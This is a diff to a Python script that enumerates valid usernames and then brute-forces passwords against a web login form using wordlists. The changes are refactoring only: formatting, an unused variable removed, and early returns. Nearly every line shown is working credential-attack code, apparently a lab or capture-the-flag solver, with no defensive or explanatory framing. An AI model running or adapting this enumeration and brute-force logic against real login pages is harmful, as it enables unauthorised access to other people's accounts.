@@ -7,9 +7,9 @@ import re
 
 def clear_screen():
   if os.name == 'posix':
-    clear_window = os.system('clear')
+    os.system('clear')
   else:
-    clear_window = os.system('cls')
+    os.system('cls')
 
 
 def get_username(url, session):
@@ -18,7 +18,7 @@ def get_username(url, session):
 
   for username in usernames:
     username = username.strip()
-    data = {'username' : username, 'password' : 'a'}
+    data = {'username': username, 'password': 'a'}
     post_request = session.post(url, data=data)
     text = post_request.text
     login_message = re.search(regex, text).group(1)    
@@ -27,14 +27,8 @@ def get_username(url, session):
 
     if "." not in login_message:
       valid_username = username
-      clear_screen()
-      print(f"[*] The username is: \"{valid_username}\"")
       usernames.close()
-      break
-
-  usernames.close()
-  
-  return valid_username
+      return valid_username
 
 
 def get_password(url, session, valid_username):
@@ -42,8 +36,8 @@ def get_password(url, session, valid_username):
 
   for password in passwords:
     password = password.strip()
-    data = {'username' : valid_username, 'password' : password}
-    post_request = session.post(url, data = data)
+    data = {'username': valid_username, 'password': password}
+    post_request = session.post(url, data=data)
     text = post_request.text
     clear_screen()
     print(f"[*] The username is: \"{valid_username}\"\n[!] The password is: \"{password}\"")
@@ -51,11 +45,7 @@ def get_password(url, session, valid_username):
     if "Invalid username or password" not in text:
       valid_password = password
       passwords.close()
-      break
- 
-  passwords.close()
-
-  return valid_password
+      return valid_password
 
 
 def main(argv):
@@ -78,6 +68,7 @@ def main(argv):
   username = get_username(url, session)
   password = get_password(url, session, username)
   clear_screen()
+  
   print(f"[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")
 
 
